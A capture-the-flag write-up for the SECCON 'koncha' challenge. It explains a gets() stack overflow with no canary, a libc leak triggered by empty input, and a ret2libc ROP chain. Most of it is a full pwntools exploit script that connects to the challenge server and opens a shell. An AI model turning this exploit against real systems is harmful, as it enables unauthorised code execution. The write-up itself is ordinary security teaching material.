### koncha-нный write-up

#### TL;DR

* Get libc leak
* Perform ROP

#### Getting to know the binary
If we open the binary in IDA we see a pretty simple main function ![IDA image](/assets/IDA_function.png)

`gets()` is clearly the vulnerability here, so considering that the challenge binary has no canary we can easily perform ROP.

#### ROP chain

* Get LIBC leak
    
    When i first launched the binary I noticed one interesting feature: if I don't provide any input and just press ENTER, the output of my name will contain strange bytes.![Leak_pic](/assets/nc_output.png) Looking into it, I figured that those bytes, when converted to int, are actually an adress from `LIBC`. Sweet! Now we don't have to worry about ASLR anymore.
    

* Get code execution

    Here we'll use pop_rdi gadget together with address of `"/bin/sh"` string in liband a call to `system`

#### Payload
Overall payload looks something like this
    import pwn

    # Set up binaries and gadgets
    binary = pwn.ELF("./chall", checksec=False)
    libc = pwn.ELF("../lib/libc.so.6", checksec=False)
    libc.symbols['pop_rdi'] = 0x0000000000023b6a
    libc.symbols['ret'] = 0x0000000000022679  # ret gadget to align the stack
    
    
    LEAK_OFFSET = 0x1f12e8
    
    io = pwn.remote("koncha.seccon.games", 9001)
    
    # Get libc leak
    io.recvline()
    io.sendline(b'')
    
    libc_leak = io.recvline()[18:-2]
    libc_leak = int.from_bytes(libc_leak, byteorder="little")
    libc.address = libc_leak - LEAK_OFFSET
    
    pwn.log.success(f"LIBC BASE: {hex(libc.address)}")
    
    BINSH_ADDRESS = next(libc.search(b"/bin/sh"))
    pwn.log.info(f"BINSH address: {hex(BINSH_ADDRESS)}")
    pwn.log.info(f"Sytem() address: {hex(libc.symbols['system'])}")
    
    # 0x50 -buffers + 0x8 - saved rbp
    payload = pwn.cyclic(0x50 + 0x8)
    
    # pop_rdi gadget
    payload += pwn.p64(libc.symbols['pop_rdi'])
    
    # address of /bin/sh is put in RDI registry
    payload += pwn.p64(BINSH_ADDRESS)
    
    # Here we align the stack
    payload += pwn.p64(libc.symbols['ret'])
    
    # And finally call system() with address of "/bin/sh" string as argumet
    payload += pwn.p64(libc.symbols['system'])  # call to system()
    
    pwn.log.info("Sending the payload now...")
    
    io.sendline(payload)
    io.recvuntil(b'Goodbye!\n')
    
    io.interactive()
    
And so we `cat` the flag `SECCON{I_should_have_checked_the_return_value_of_scanf}`
